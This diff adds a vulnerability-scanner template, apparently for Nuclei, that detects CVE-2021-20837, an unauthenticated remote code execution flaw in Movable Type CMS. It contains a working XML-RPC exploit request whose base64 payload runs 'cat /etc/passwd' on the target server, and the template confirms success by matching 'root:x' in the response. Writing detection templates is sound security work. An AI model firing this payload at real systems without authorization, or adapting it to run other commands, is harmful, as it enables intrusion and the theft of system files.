@@ -1,0 +1,59 @@
+id: CVE-2021-20837
+info: 
+  author: hackergautam
+  classification: 
+    cve-id: CVE-2021-20837
+    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+    cwe-id: CWE-306
+  description: "MovableType(MT) which is open source CMS is vulnerable to Unauth RCE.\n"
+  name: "Unauthenticated RCE in MovableType"
+  reference: 
+    - "https://nemesis.sh/posts/movable-type-0day/"
+  severity: critical
+  tags: "cve,cve2021,movabletype,rce"
+requests: 
+  - 
+    matchers: 
+      - 
+        condition: and
+        part: body
+        type: word
+        words: 
+          - "root:x"
+      - 
+        status: 
+          - 200
+        type: status
+      - 
+        condition: and
+        part: header
+        type: word
+        words: 
+          - text/xml
+    matchers-condition: and
+    raw: 
+      - |
+          POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: PoC-RCE
+          Content-Type: text/xml; charset=UTF-8
+          Connection: close
+          
+          <?xml version="1.0"?>
+            <methodCall>
+              <methodName>
+              mt.handler_to_coderef
+              </methodName>
+          <params>
+            <param>
+              <value>
+                <base64>
+                YGNhdCAvZXRjL3Bhc3N3ZGA=
+                </base64>
+              </value>
+            </param>
+          </params>
+            </methodCall>
+
+
